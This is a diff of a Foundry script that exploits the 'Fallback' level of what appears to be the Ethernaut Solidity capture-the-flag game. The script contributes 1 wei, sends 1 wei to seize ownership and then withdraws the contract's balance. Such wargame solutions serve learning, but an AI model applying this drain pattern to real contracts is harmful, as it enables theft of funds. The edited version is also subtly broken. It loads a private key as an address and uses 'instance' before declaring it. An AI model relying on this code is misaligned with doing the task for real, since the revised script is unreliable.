@@ -8,18 +8,17 @@ import {Fallback} from "src/01/Fallback.sol";
 
 contract Exploit is Script {
 
-      address instance = vm.envAddress("INSTANCE_LEVEL1");
       Fallback level = Fallback(payable(instance));
-
+      address instance = vm.envAddress("INSTANCE_LEVEL1");
+      address hacker = vm.envAddress("PRIVATE_KEY");   
+      
       function run() external {
 
-          vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
+          vm.startBroadcast(hacker);
           level.contribute{value: 1 wei}();
           (bool sent, ) = address(level).call{value: 1 wei}("");
           require(sent, "Failed to call send()");
           level.withdraw();
-
           vm.stopBroadcast();
     }
 }
